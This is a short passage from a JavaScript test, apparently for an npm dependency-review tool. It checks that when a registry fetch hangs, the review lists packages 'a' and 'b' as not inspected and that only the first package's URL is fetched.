    { 'node_modules/a': pkg('a', '1.0.1'), 'node_modules/b': pkg('b', '1.0.1') }, { registryFetchSeconds: 0.05 });
  s.registry.hanging.add(url('a', '1.0.1'));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `a 1\.0\.1`\n- `b 1\.0\.1`\n/);
  assert.deepEqual(s.registry.fetched, [url('a', '1.0.1')]);
});
